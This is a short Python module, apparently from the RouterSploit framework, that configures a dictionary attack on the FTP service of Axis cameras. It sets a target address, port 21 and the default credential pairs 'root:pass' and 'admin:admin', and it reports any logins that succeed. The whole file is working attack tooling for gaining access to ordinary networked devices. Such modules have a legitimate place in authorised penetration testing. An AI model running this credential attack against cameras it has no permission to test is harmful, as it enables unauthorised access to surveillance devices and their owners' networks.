from routersploit.core.exploit import *
from routersploit.modules.creds.generic.ftp_default import Exploit as FTPDefault


class Exploit(FTPDefault):
    __info__ = {
        "name": "Axis Camera Default FTP Creds",
        "description": "Module performs dictionary attack against Axis Camera FTP service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Axis Camera",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("root:pass,admin:admin", "User:Pass or file with default credentials (file://)")
